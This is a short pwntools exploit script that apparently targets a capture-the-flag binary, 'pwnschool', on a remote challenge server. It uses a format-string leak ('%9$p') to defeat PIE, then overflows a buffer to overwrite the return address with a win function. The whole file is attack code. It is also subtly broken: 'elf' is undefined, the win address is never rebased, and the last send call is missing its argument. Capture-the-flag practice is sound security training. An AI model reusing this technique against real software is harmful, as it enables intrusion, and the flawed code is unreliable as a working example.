#!/usr/bin/env python3
from pwn import *

p = remote("spaceheroes-pwnschool.chals.io", 443, ssl=True, sni="spaceheroes-pwnschool.chals.io")

# Stage 1
p.sendlineafter(b'>>> ', b'1')
p.sendlineafter(b'>>> ', cyclic(0x20))

# Stage 2
p.sendlineafter(b'>>> ', b'2')
p.sendlineafter(b'>>> ', b'%9$p')
p.recvuntil(b'now: ')

pie_addr = int(p.recvuntil(b'.')[:-1].decode(), 16)
elf.address = pie_addr - 0x1380
win = 0x2139

# Stage 3
p.sendlineafter(b'>>> ', b'3')
p.sendlineafter(b'>>> ', hex(win).encode())

# Stage 4
p.sendlineafter(b'>>> ', b'4')
p.sendlineafter(cyclic(0x30) + p64(win))
p.interactive()
